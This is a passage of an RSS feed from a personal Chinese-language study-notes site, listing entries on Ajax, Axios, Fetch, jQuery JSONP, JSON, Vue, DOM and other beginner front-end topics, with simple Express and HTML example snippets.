服务端  const { json } = require(&amp;#39;body-parser&amp;#39;) const express = require(&amp;#39;express&amp;#39;)  const app = express()  const port = 8000  app.all(&amp;#39;/delay&amp;#39;, (request, response) =&amp;gt; {  response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;)  response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;)  // 设置延时响应  setTimeout(() =&amp;gt; {  response.send(&amp;#39;Hello IE&amp;#39;);  }, 1000) })   app.listen(port, () =&amp;gt; {  console.log(`服务已经启动`) }) HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Axios</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/axios/</link>
      <pubDate>Sun, 01 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/axios/</guid>
      <description>Axios Axios 是一个基于 promise 的 HTTP 库，简单的讲就是可以发送get、post请求。说到get、post，大家应该第一时间想到的就是Jquery吧，毕竟前几年Jquery比较火的时候，大家都在用他。但是由于Vue、React等框架的出现，Jquery也不是那么吃香了。也正是Vue、React等框架的出现，促使了Axios轻量级库的出现，因为Vue等，不需要操作Dom，所以不需要引入Jquery.js了。
安装 npm install axios CND &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/axios/0.27.2/axios.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; </description>
    </item>
    
    <item>
      <title>Axios 发送 Ajax 请求</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/axios-%E5%8F%91%E9%80%81-ajax/</link>
      <pubDate>Sun, 01 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/axios-%E5%8F%91%E9%80%81-ajax/</guid>
      <description>Axios 发送 Ajax 请求 服务端  const { json } = require(&amp;#39;body-parser&amp;#39;) const express = require(&amp;#39;express&amp;#39;)  const app = express()  const port = 8000  app.all(&amp;#39;/axios&amp;#39;, (request, response) =&amp;gt; {  response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;)  response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;)   const data = { name: &amp;#39;Rainy&amp;#39; }  const str = JSON.stringify(data);  response.send(data) })   app.listen(port, () =&amp;gt; {  console.log(`服务已经启动`) }) HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Fetch 发送 Ajax</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/fetch-%E5%8F%91%E9%80%81-ajax/</link>
      <pubDate>Sun, 01 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/fetch-%E5%8F%91%E9%80%81-ajax/</guid>
      <description>Fetch 发送 Ajax 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;) const express = require(&amp;#39;express&amp;#39;)  const app = express()  const port = 8000  app.all(&amp;#39;/fetch&amp;#39;, (request, response) =&amp;gt; {  response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;)  response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;)   const data = { name: &amp;#39;Rainy&amp;#39; }  const str = JSON.stringify(data);  response.send(data) })   app.listen(port, () =&amp;gt; {  console.log(`服务已经启动`) }) HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Jquery 发送 Ajax</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/jquery-%E5%8F%91%E9%80%81-ajax/</link>
      <pubDate>Sun, 01 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/jquery-%E5%8F%91%E9%80%81-ajax/</guid>
      <description>Jquery 发送 Ajax 服务端 HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;./css/main.css&amp;#34;&amp;gt;  &amp;lt;title&amp;gt;Jquery 发送 Ajax&amp;lt;/title&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;button id=&amp;#34;btn&amp;#34;&amp;gt;点击按钮，发送 GET 请求&amp;lt;/button&amp;gt;  &amp;lt;button id=&amp;#34;btnTwo&amp;#34;&amp;gt;点击按钮，发送 POST 请求&amp;lt;/button&amp;gt;  &amp;lt;button id=&amp;#34;btnThree&amp;#34;&amp;gt;点击按钮，发送通用方式请求&amp;lt;/button&amp;gt;   &amp;lt;div id=&amp;#34;result&amp;#34;&amp;gt;&amp;lt;/div&amp;gt;   &amp;lt;/body&amp;gt;  &amp;lt;script src=&amp;#34;./js/main.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;/html&amp;gt; CSS #result{  width: 200px;  height: 100px;  border: 1px solid #999; } JavaScrip // get 方式 $(&amp;#39;#btn&amp;#39;).</description>
    </item>
    
    <item>
      <title>Jquery 发送 Jsonp</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E8%B7%A8%E5%9F%9F/jquery-%E5%8F%91%E9%80%81-jsonp/</link>
      <pubDate>Sun, 01 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E8%B7%A8%E5%9F%9F/jquery-%E5%8F%91%E9%80%81-jsonp/</guid>
      <description>Jquery 发送 Jsonp 服务端  const { json } = require(&amp;#39;body-parser&amp;#39;) const express = require(&amp;#39;express&amp;#39;)  const app = express()  const port = 8000  app.all(&amp;#39;/jquery_jsonp&amp;#39;, (request, response) =&amp;gt; {  response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;)  response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;)  // 定义数据  const data = {  city: &amp;#39;贵州&amp;#39;,  }  // 将数据转为字符串  let str = JSON.stringify(data)  // 接受 callback  let cb = request.query.callback  // 响应结果，  response.</description>
    </item>
    
    <item>
      <title>原生 Jsonp 的实现</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E8%B7%A8%E5%9F%9F/%E5%8E%9F%E7%94%9F-jsonp-%E7%9A%84%E5%AE%9E%E7%8E%B0/</link>
      <pubDate>Sun, 01 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E8%B7%A8%E5%9F%9F/%E5%8E%9F%E7%94%9F-jsonp-%E7%9A%84%E5%AE%9E%E7%8E%B0/</guid>
      <description>原生 Jsonp 的实现 服务端  const { json } = require(&amp;#39;body-parser&amp;#39;) const express = require(&amp;#39;express&amp;#39;)  const app = express()  const port = 8000  app.all(&amp;#39;/check&amp;#39;, (request, response) =&amp;gt; {  response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;)  response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;)  // 定义数据  const data = {  exist: 1,  msg: &amp;#39;用户已经存在&amp;#39;  }  // 将数据转为字符串  let str = JSON.stringify(data)  // 响应结果，一个函数调用，函数已经在前端提前声明  response.end(`handle(${str})`); })  app.listen(port, () =&amp;gt; {  console.</description>
    </item>
    
    <item>
      <title>Ajax</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/ajax/</link>
      <pubDate>Sat, 30 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/ajax/</guid>
      <description>Ajax 可以理解为异步的 JavaScript 和 xml。
它是一种在无需重新加载整个网页的情况下，能够更新部分网页内容的技术。
它不是一种新的编程语言，而是一种将现有标准组合在一起使用的新方式。
优点 可以无需刷新页面与服务器进行通信。
允许根据用户事件来更新部分页面内容。
缺点 没有浏览历史，无法进行网页后退或前进的操作。
存在跨域问题。默认情况下，不同的域名之间，无法发送 Ajax 请求。
对 SEO 的优化不友好，Ajax 返回当数据不会在网页源代码中存在。</description>
    </item>
    
    <item>
      <title>Ajax GET 请求</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/get-%E8%AF%B7%E6%B1%82/</link>
      <pubDate>Sat, 30 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/get-%E8%AF%B7%E6%B1%82/</guid>
      <description>GET 请求 使用 GET 的方式向服务端发送一个请求。
服务端 const express = require(&amp;#39;express&amp;#39;) const app = express() const port = 8000 app.get(&amp;#39;/server&amp;#39;, (request, response) =&amp;gt; {  response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;)  response.send(&amp;#39;Hello World! GET&amp;#39;) }) // 允许 get 方式的请求 app.get(&amp;#39;/server&amp;#39;, (request, response) =&amp;gt; {   response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;)  response.send(&amp;#39;Hello World!&amp;#39;) }) app.listen(port, () =&amp;gt; {  console.log(`服务已经启动`) }) HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;  &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.</description>
    </item>
    
    <item>
      <title>Ajax 响应 JSON 数据</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E5%93%8D%E5%BA%94-json-%E6%95%B0%E6%8D%AE/</link>
      <pubDate>Sat, 30 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/%E5%93%8D%E5%BA%94-json-%E6%95%B0%E6%8D%AE/</guid>
      <description>响应 JSON 数据 服务端 const { json } = require(&amp;#39;body-parser&amp;#39;) const express = require(&amp;#39;express&amp;#39;) const app = express() const port = 8000 app.all(&amp;#39;/json-server&amp;#39;, (request, response) =&amp;gt; {  response.setHeader(&amp;#39;Access-Control-Allow-Origin&amp;#39;, &amp;#39;*&amp;#39;)  response.setHeader(&amp;#39;Access-Control-Allow-Headers&amp;#39;, &amp;#39;*&amp;#39;)  // 响应一个数据  const data = {  name: &amp;#39;Rainy&amp;#39;,  age: &amp;#39;18&amp;#39;  }  // 将对象转换为字符串类型的数据  let str = JSON.stringify(data);  // 设置响应体，响应体只能是一个字符串  response.send(str) })  app.listen(port, () =&amp;gt; {  console.log(`服务已经启动`) }) HTML &amp;lt;!</description>
    </item>
    
    <item>
      <title>JavaScrip JSON</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/json/json/</link>
      <pubDate>Sat, 30 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/json/json/</guid>
      <description>JOSN 一种轻量级的数据传输格式。本质上就是对象，用来传输的对象。
它在与后端的数据交互中有较为广泛的应用。
优点 JSON 比 XML 更小、更快，更易解析。
语法 客户端与服务端的交互数据无非就是两种：
 数组 对象  于是乎，JSON 所表示的数据要么就是对象，要么就是数组。
JSON 数组 var employees = [ 	{ &amp;#34;firstName&amp;#34;:&amp;#34;Bill&amp;#34; , &amp;#34;lastName&amp;#34;:&amp;#34;Gates&amp;#34; }, 	{ &amp;#34;firstName&amp;#34;:&amp;#34;George&amp;#34; , &amp;#34;lastName&amp;#34;:&amp;#34;Bush&amp;#34; }, 	{ &amp;#34;firstName&amp;#34;:&amp;#34;Thomas&amp;#34; , &amp;#34;lastName&amp;#34;: &amp;#34;Carter&amp;#34; } 	]; JSON 对象 var obj = {   age: 20,  str: &amp;#34;zhongfucheng&amp;#34;,  method: function () {  alert(&amp;#34;我爱学习&amp;#34;);  }   }; </description>
    </item>
    
    <item>
      <title>JavaScrip JSON 方法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/json/json-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sat, 30 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/json/json-%E6%96%B9%E6%B3%95/</guid>
      <description>JSON 方法 stringify() 将一个对象或值转换为 JSON 字符串。
 var obj = { 	name: &amp;#39;rainy&amp;#39;, 	age: &amp;#39;20&amp;#39;, }; var result = JSON.stringify(obj); // 对象 console.log(obj);  // 字符串 console.log(result); parse() 将 JSON 字符串转换为对象。
var json = &amp;#39;{&amp;#34;name&amp;#34;:&amp;#34;rainy&amp;#34;, &amp;#34;age:&amp;#34;:20}&amp;#39;;var obj = JSON.parse(json);// 字符串console.log(json);// 对象console.log(obj); </description>
    </item>
    
    <item>
      <title>Nodemon</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/nodemon/</link>
      <pubDate>Sat, 30 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/nodemon/</guid>
      <description>Nodemon 当我们开发一个 node 后端服务时，每次更改服务端文件，均需重启一下服务才能生效。这使我们的开发效率降低了很多。Nodemon 的出现，放我们可以随时监听文件的变更，自动重启服务，我们开发时只需关注代码即可，不再需要手动重启服务。
安装 终端运行
npm install -g nodemon 使用 nodemon server.js </description>
    </item>
    
    <item>
      <title>XML</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/json/xml/</link>
      <pubDate>Sat, 30 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/json/xml/</guid>
      <description>XML 可扩展标记语言，主要用来传输和存储数据。
XML 和 HTML类似，不同的是 HTML 中都是预定义的标签，用来呈现数据；而 XML 中没有预定义标签，都是自定义标签，用来表示一些数据。
不过，现在地 XML 已经被 JSON 取代了。</description>
    </item>
    
    <item>
      <title>Vue</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/vue/</link>
      <pubDate>Sun, 10 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/vue/</guid>
      <description>Vue Vue 是一套用于构建用户界面的渐进式 JavaScript 框架。
它主要解决了前端开发中的核心痛点 —— 复杂的 DOM 操作。
特点 渐进式 可以只将网站中的一个页面或网站中的某一个区域使用 Vue 来开发。当然，也可以整个网站都用 Vue 来开发。
组件化 采用组件化开发模式，将一个复杂的网站，简化为一个个的组件，独立开发，能提高代码复用率，且让代码更好维护。
响应式 数据响应式，即后台数据（model）发生变化，前台的内容（View），也会相应的变化。
其他 不在使用传统的命令式编码，在Vue中，使用声明式编码，让我们无需直接操作 DOM，提高开发效率。
. 使用虚拟 DOM + 优秀的 Diff 算法，尽量复用 DOM 节点。
Vue 应用场景 前台部分页面，用户看到的网站页面。
中台全部页面，网站给某些额非官方人员提供的管理页面。比如淘宝卖家的管理后台等。
后台全部页面，网站官方的后台管理页面。</description>
    </item>
    
    <item>
      <title>Vue 实例</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/vue-%E5%AE%9E%E4%BE%8B/</link>
      <pubDate>Sun, 10 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/vue-%E5%AE%9E%E4%BE%8B/</guid>
      <description>Vue 实例 new 一个 Vue 实例，并将其赋给一个配置对象 ：
var vm = new Vue({}) 该配置对象vm中有非常多的属性，大部分属性都是以$和_开头，这是为了避免与我们定义的属性重名。
以$开头的属性，都是供开发者使用的；而以_开头的属性，是内置属性，不供我们使用。</description>
    </item>
    
    <item>
      <title>使用 Vue</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E4%BD%BF%E7%94%A8-vue/</link>
      <pubDate>Sun, 10 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E4%BD%BF%E7%94%A8-vue/</guid>
      <description>使用 Vue  引入 Vue.js。  本地 js 文件。 Vue CDN。   脚手架。  官方脚手架vue-cli。 其他民间脚手架，如webpack-simple。 手动搭建，灵活性高。    我的第一个 Vue 程序 创建 Vue 实例，并传给一个配置对象。
root 容器里的代码被称为 Vue 模板，模板中是插值语法{{}}，其中只能写 JavaScrip 表达式。
一个 Vue 实例，只能控制一个容器，它们之间只能一一对应。
HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;   &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;!</description>
    </item>
    
    <item>
      <title>前端和后端</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/%E5%89%8D%E7%AB%AF%E5%92%8C%E5%90%8E%E7%AB%AF/</link>
      <pubDate>Sun, 10 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/%E5%89%8D%E7%AB%AF%E5%92%8C%E5%90%8E%E7%AB%AF/</guid>
      <description>前端和后端 前端 前端是链接终端设备与人的技术。行的网页，并配合后端做网页的数据显示和交互等可视方面的工作内容。 后端是指用户看不见的东西，通常是与前端工程师进行数据交互及网站数据的保存和读取，相对来说后端涉及到的逻辑代码比前端要多的多，后端考虑的是底层业务逻辑的实现，平台的稳定性与性能等。
所用技术 前端开发用到的技术包括但不限于html5、css3、javascript、jquery、Bootstrap、Node.js 、Webpack，AngularJs，ReactJs，VueJs等技术。 后端开发 以java为例 主要用到的 是包括但不限于Struts spring springmvc Hibernate Http协议 Servlet Tomcat服务器等技术。
工作职责 前端工程师主要的工作职责分为三大部分，分别是传统的Web前端开发，移动端开发和大数据呈现端开发。Web前端开发主要针对的是PC端开发任务；移动端开发则包括Android开发、iOS开发和各种小程序开发，在移动互联网迅速发展的带动下，移动端的开发任务量是比较大的，随着5G标准的落地，未来移动端的开发任务将得到进一步的拓展；大数据呈现则主要是基于已有的平台完成最终分析结果的呈现，呈现方式通常也有多种选择，比如大屏展示等。 后端工程师的主要职责也集中在三大部分，分别是平台设计、接口设计和功能实现。平台设计主要是搭建后端的支撑服务容器；接口设计主要针对于不同行业进行相应的功能接口设计，通常一个平台有多套接口，就像卫星导航平台设有民用和军用两套接口一样；功能实现则是完成具体的业务逻辑实现。
知识结构 在知识结构方面，前端开发涉及到的内容包括Html、CSS、JavaScript、Android开发（采用Java或者kotlin）、iOS开发（采用OC或者Swift）、各种小程序开发技术（类Html），随着前端开发任务的不断拓展，前端开发后端化也是一个较为明显的趋势，比如Nodejs的应用。 后端开发通常需要根据业务场景进行不同语言的选择，另外后端开发的重点在于算法设计、数据结构、性能优化等方面，在具体的功能实现部分可以采用Java、Python或者PHP等编程语言来实现。对于不少中小企业来说，后端开发通常都会采用开源的开发平台，这样就可以把精力集中在业务处理上，通常应用级程序员就可以解决问题，相应的开发成本也会有大幅度的下降。
应用范围 从应用范围来看，前端开发不仅被常人所知、且应用场景也要比后端广泛的太多太多。 一是PC (Personal Computer) 即个人电脑。目前电脑端仍是前端一个主要的领域，主要分为面向大众的各类网站，如新闻媒体、社交、电商、论坛等和面向管理员的各种 CMS (内容管理系统)和其它的后台管理系统。 二Web App 是指使用 Web 开发技术，实现的有较好用户体验的 Web 应用程序。它是运行在手机和桌面端浏览中，随着移动端网络速度的提升，Web App 为我们提供了很大的便利。此外近两年 Google 提出了一种新的 Web App 形态，即 PWA(渐进增强 Web APP) 。三WeChat (微信) 这个平台，拥有大量的用户群体，因此它也是我们前端开发另一个重要的领域。微信的公众号与订阅号为市场营销和自媒体从业者，打造了一个新的天地。 四Hybrid App (混合应用) 是指介于 Web App、原生 App (主要是 Android 或 iOS )之间的 App，它兼具原生 App 良好用户交互体验的优势和 Web App 跨平台开发的优势。 五Game（游戏），HTML5 游戏从 2014 年 Egret 引擎开发的神经猫引爆朋友圈之后，就开始一发不可收拾。不过现在游戏开发变得越来越复杂，需要制作各种炫丽炫丽的效果，还要制作各炫丽于 2D 或者 3D 的场景。 六Desktop桌面应用软件，就是我们日常生活中电脑中安装的各类软件。早期要开发桌面应用程序，就需要有专门的语言 UI (界面) 库支持，如 C++ 中的 Qt 库、MFC 库，Java 的 Swing、Python 的 PyQT 等，否则语言是没办法进行快速界面开发。 七Server Node.</description>
    </item>
    
    <item>
      <title>JavaScript DOM</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/dom/</link>
      <pubDate>Mon, 04 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/dom/</guid>
      <description>DOM DOM （文档对象模型）中提供了一系列的方法，DOM 是这一些列方法的统称。这些方法使得我们可以操作 HTML 和 XML。
DOM 就像一棵节点树一样，从文档的根（document），依次分支展开，每一个元素，都可以看作是树的一个节点，每一个元素都是一个对象。
使用 DOM 操作文档中的元素时，必须先加载整个 HTML 文档（body 之前的代码 ），再加载 JS 文件；因为没有完整的 DOM 模型，DOM 的一些操作就无法完成，会导致报错。
graph TD;Node --&amp;gt; Document;Node --&amp;gt; CharacterData;Node --&amp;gt; Element;Node --&amp;gt; Atrr;Document --&amp;gt; HTMLDocument;Document --&amp;gt; XMLDocument;CharacterData --&amp;gt; TextCharacterData --&amp;gt; CommentElement --&amp;gt; HTMLElementAttrHTMLElement --&amp;gt; HTMLHeadElementHTMLElement --&amp;gt; HTMLBodyElementHTMLElement --&amp;gt; HTMLTitleElementHTMLElement --&amp;gt; HTMLParagraphlement Node 最终指向 Object.prototype。
getElementById() getElementById() 定义在了 Document.prototype 上，这说明 XMLDocument 和 HTMLDocument 都能使用 getElementById()，但Element 不能使用 getElementById()。</description>
    </item>
    
    <item>
      <title>JavaScript ES5 严格模式</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/es5-%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Mon, 04 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/es5-%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F/</guid>
      <description>ES5 严格模式 ECMAScript 是 JavaScript 的一个标准。
ES5 严格模式指的是：我们应该对 ES3 和 ES5 产生冲突的部分使用哪个版本的规则？
当我们开启 ES5 严格模式后，那么 ES3 和 ES5 产生冲突的部分会遵循 ES5 的规则，否则会使用 ES3（浏览器默认遵循 ES3 的规则）
&amp;ldquo;use strict&amp;rdquo; 使某一作用域内的代码不在兼容 ES3 中的一些不规则的语法，使用全新的 ES5 的语法。
如何启用 ES5 严格模式 在作用域顶端添加语句&amp;quot;use strict&amp;quot;即可，启用之后，ES3 中的一些方法就无法使用了。比如arguments的callee属性：
&amp;#39;use strict&amp;#39;; function test() { 	console.log(arguments.callee); } test(); 浏览器会出现以下错误：
Uncaught TypeError: &amp;#39;caller&amp;#39;, &amp;#39;callee&amp;#39;, and &amp;#39;arguments&amp;#39; properties may not be accessed on strict mode functions or the arguments objects for calls to them 同样，也可以使某一局部作用域支持 ES5，而其他作用域支持 ES3：</description>
    </item>
    
    <item>
      <title>JavaScript Try Catch</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%8E%A7%E5%88%B6%E6%B5%81/try-catch/</link>
      <pubDate>Mon, 04 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%8E%A7%E5%88%B6%E6%B5%81/try-catch/</guid>
      <description>Try Catch 为了容错，防止程序报错后引起整个程序的终止运行
try 中有错误信息 就会执行 catch 中的代码，没有这不会执行 catch 之中的代码
catch 有一个参数，参数名自定义 比如 e
那么这个 e 就会有两个参数 e.name 和 e.message
Error.name EvalError：eval()的使用与定义不一致
RangeError：数值越界
ReferenceError：非法或不能识别的引用数值，比如当一个变量未经声明就使用或者一个函数未定义就调用的时候，会出现 ReferenceError。
SyntaxError：语法解析错误
TypeError：操作数类型错误
URlError：URI 处理函数使用不当</description>
    </item>
    
    <item>
      <title>JavaScript with</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/other/with/</link>
      <pubDate>Mon, 04 Apr 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/other/with/</guid>
      <description>with with(ogj)函数可以改变自身代码块中的代码的作用域链，它会将 obj 放到它自己代码块中的代码的作用域链的最顶端，也就是会先去 obj 的作用域中去寻找变量。
ES5 中不支持 with 函数。
 var obj = {  age: &amp;#34;456&amp;#34;,  name: &amp;#34;your&amp;#34;, }  function test() {  var age = &amp;#39;123&amp;#39;;  var name = &amp;#39;my&amp;#39;;  with (obj) {  // 下面的输出不会返回自身作用域（test 函数的作用域）下的 age 和 name。  // 只会返回全局作用域下的 obj 对象的 age 和 name，因为作用域被 with 函数改变了。  console.log(age);  console.log(name);  } } test(); 替代链式调用 with (document) {  write(&amp;#34;with 调用&amp;#34; + &amp;#34;&amp;lt;br/&amp;gt;&amp;#34;) }  //等同于 document.</description>
    </item>
    
    <item>
      <title>Css 选择器</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/css/%E9%80%89%E6%8B%A9%E5%99%A8/</link>
      <pubDate>Sun, 12 Dec 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/css/%E9%80%89%E6%8B%A9%E5%99%A8/</guid>
      <description>选择器 ID 选择器，尽量少用，</description>
    </item>
    
    <item>
      <title>Echarts 文字样式</title>
      <link>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E6%96%87%E5%AD%97%E6%A0%B7%E5%BC%8F/</link>
      <pubDate>Sat, 13 Nov 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E6%96%87%E5%AD%97%E6%A0%B7%E5%BC%8F/</guid>
      <description>文字样式 fontSize: 11, color: &amp;#34;#eee&amp;#34;, textShadowColor: &amp;#34;rgba(0, 0, 0, 1)&amp;#34;, textShadowBlur: 10, textShadowOffsetX: 1, textShadowOffsetY: 1, 图形样式 barBorderRadius: 2, shadowColor: &amp;#34;rgba(0, 0 0, 0.3)&amp;#34;, shadowBlur: 3, shadowOffsetX: 1, shadowOffsetY: 1, </description>
    </item>
    
    <item>
      <title>快速使用 Echarts</title>
      <link>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Sat, 13 Nov 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/</guid>
